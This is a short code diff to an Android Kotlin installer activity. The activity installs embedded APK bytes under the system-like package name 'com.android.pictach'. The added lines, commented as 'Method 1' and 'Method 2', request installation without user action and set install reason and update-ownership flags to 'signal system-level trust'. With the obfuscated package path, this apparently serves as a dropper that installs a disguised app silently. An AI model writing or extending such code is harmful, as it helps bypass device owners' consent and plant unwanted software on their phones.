@@ -3,6 +3,7 @@ package com.cristal.bristral.tristal.mistral
 import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageInstaller
+import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -56,10 +57,20 @@ class InstallActivity : AppCompatActivity() {
                 setAppPackageName("com.android.pictach")
                 setSize(apkBytes.size.toLong())
 
+                // Method 1 — Session-Based PackageInstaller
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                     setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
                 }
+
+                // Method 2 — INSTALL_PACKAGES system-level trust signals
+                setInstallReason(PackageManager.INSTALL_REASON_USER)
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    setRequestUpdateOwnership(true)
+                }
             }
+
+            // Method 2 — Set installer package to signal system-level trust
 
             val sessionId = packageInstaller.createSession(params)
             val session   = packageInstaller.openSession(sessionId)
